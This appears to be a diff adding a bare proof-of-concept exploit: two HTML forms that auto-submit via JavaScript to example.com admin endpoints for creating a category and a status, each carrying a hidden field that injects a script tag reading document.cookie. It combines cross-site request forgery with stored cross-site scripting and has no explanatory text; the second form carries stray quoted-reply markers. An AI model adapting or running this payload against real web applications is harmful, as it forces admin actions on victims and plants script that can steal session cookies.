@@ -1,0 +1,20 @@
+&lt;form action=&quot;http://www.example.com/admin/create_new_category&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[id]&quot; value=&quot;999&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[name]&quot; value='mynewcat&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Create New Category!&quot; &gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/admin/create_new_status&quot; method=&quot;post&quot;  name=&quot;main&quot; &gt;
+&gt; &lt;input type=&quot;hidden&quot; name=&quot;status[id]&quot; value=&quot;999&quot; &gt;
+&gt; &lt;input type=&quot;hidden&quot; name=&quot;status[name]&quot; value='status name&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' &gt;
+&gt; &lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Create New Status!&quot; &gt;
+&gt; &lt;/form&gt;
+&gt; &lt;script&gt;
+&gt; document.main.submit();
+&gt; &lt;/script&gt;
+&gt; 
